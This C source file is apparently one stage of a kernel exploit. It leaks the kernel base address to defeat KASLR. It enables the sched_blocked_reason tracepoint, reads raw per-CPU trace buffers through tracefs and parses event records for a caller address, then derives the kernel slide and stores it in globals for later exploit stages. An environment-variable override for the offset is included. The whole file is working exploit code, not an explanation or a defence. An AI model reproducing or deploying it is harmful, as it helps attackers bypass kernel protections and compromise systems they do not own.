#include "common.h"

#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
#ifndef SLIDE_TRACEFS_EVENT_ID
#define SLIDE_TRACEFS_EVENT_ID 109
#endif

static int slide_tracefs_write(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  size_t len = strlen(value);
  ssize_t wrote = write(fd, value, len);
  close(fd);
  return wrote == (ssize_t)len;
}

static int slide_tracefs_parse_page(
    const unsigned char *page, size_t page_len, uintptr_t *candidate_out) {
  if (page_len < 20) {
    return 0;
  }

  uint64_t commit = 0;
  memcpy(&commit, page + 8, sizeof(commit));
  size_t data_len = (size_t)(commit & 0xfffULL);
  size_t end = 16 + data_len;
  if (end > page_len) {
    end = page_len;
  }

  for (size_t pos = 16; pos + 4 <= end;) {
    uint32_t event_header = 0;
    memcpy(&event_header, page + pos, sizeof(event_header));
    uint32_t type_len = event_header & 0x1fU;
    if (type_len == 30) {
      pos += 8;
      continue;
    }
    if (type_len == 31) {
      pos += 12;
      continue;
    }
    if (type_len == 0 || type_len >= 29) {
      break;
    }

    size_t record_len = (size_t)type_len * 4;
    size_t record = pos + 4;
    if (record + record_len > end) {
      break;
    }
    uint16_t event_id = 0;
    memcpy(&event_id, page + record, sizeof(event_id));
    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
      uint64_t caller = 0;
      memcpy(&caller, page + record + 16, sizeof(caller));
      uint64_t link_caller =
          KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
      if (caller >= link_caller) {
        uint64_t candidate = caller - link_caller;
        if (candidate <= 0x1f0000ULL && (candidate & 0x7fffULL) == 0) {
          pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
                     (unsigned long long)caller,
                     (unsigned long long)candidate);
          *candidate_out = (uintptr_t)candidate;
          return 1;
        }
      }
    }
    pos = record + record_len;
  }
  return 0;
}

static int slide_tracefs_leak_kernel_base(void) {
  static const char tracing_on[] =
      SLIDE_TRACEFS_ROOT "/tracing_on";
  static const char event_enable[] =
      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";

  if (!slide_tracefs_write(tracing_on, "0") ||
      !slide_tracefs_write(event_enable, "1") ||
      !slide_tracefs_write(tracing_on, "1")) {
    pr_error("slide tracefs setup failed errno=%d\n", errno);
    return 0;
  }

  sleep(1);

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  uintptr_t candidate = 0;
  int found = 0;
  for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
    char path[128];
    snprintf(path, sizeof(path),
             SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int pfd[2];
    if (pipe(pfd) < 0) continue;
    pid_t child = fork();
    if (child == 0) {
      close(pfd[0]);
      int fd = open(path, O_RDONLY | O_CLOEXEC);
      if (fd >= 0) {
        unsigned char buf[4096];
        ssize_t n;
        while ((n = read(fd, buf, sizeof(buf))) > 0)
          write(pfd[1], buf, n);
        close(fd);
      }
      close(pfd[1]);
      _exit(0);
    }
    close(pfd[1]);
    unsigned char *page = malloc(524288);
    ssize_t total = 0;
    fd_set rfds;
    struct timeval tv;
    while (total < 524288) {
      FD_ZERO(&rfds);
      FD_SET(pfd[0], &rfds);
      tv.tv_sec = 3; tv.tv_usec = 0;
      if (select(pfd[0]+1, &rfds, NULL, NULL, &tv) <= 0) break;
      ssize_t got = read(pfd[0], page + total, 524288 - total);
      if (got <= 0) break;
      total += got;
    }
    kill(child, SIGTERM);
    waitpid(child, NULL, 0);
    close(pfd[0]);
    if (total > 0) {
      for (size_t off = 0; off < (size_t)total && !found; ) {
        size_t remain = (size_t)total - off;
        if (remain < 20) break;
        uint64_t commit = 0;
        memcpy(&commit, page + off + 8, sizeof(commit));
        size_t data_len = (size_t)(commit & 0xfffULL);
        size_t page_end = off + 16 + data_len;
        if (page_end > (size_t)total) page_end = (size_t)total;
        if (slide_tracefs_parse_page(page + off, page_end - off, &candidate))
          found = 1;
        off = (page_end + 15) & ~(size_t)15;
      }
    }
    free(page);
  }
  slide_tracefs_write(event_enable, "0");
  if (!found) {
    pr_error("slide tracefs worker caller not found\n");
    return 0;
  }

  slide_p0_offset = candidate;
  kaslr_base = KIMAGE_TEXT_BASE + candidate;
  kaslr_slide = candidate;
  kaslr_done = 1;
  pr_success("slide-kaslr-ok source=tracefs pid=%d base=%016llx "
             "slide=%016llx p0_offset=%08zx\n",
             getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide, slide_p0_offset);
  return 1;
}

int slide_leak_kernel_base(void) {
  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
  if (forced_offset_arg && *forced_offset_arg) {
    char *end = NULL;
    errno = 0;
    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
        (value & 0x7fffULL) != 0) {
      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
      return 0;
    }
    slide_p0_offset = (uintptr_t)value;
    kaslr_base = KIMAGE_TEXT_BASE + slide_p0_offset;
    kaslr_slide = slide_p0_offset;
    kaslr_done = 1;
    pr_success("slide-kaslr-ok source=forced pid=%d base=%016llx "
               "slide=%016llx p0_offset=%08zx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide, slide_p0_offset);
    return 1;
  }
  return slide_tracefs_leak_kernel_base();
}
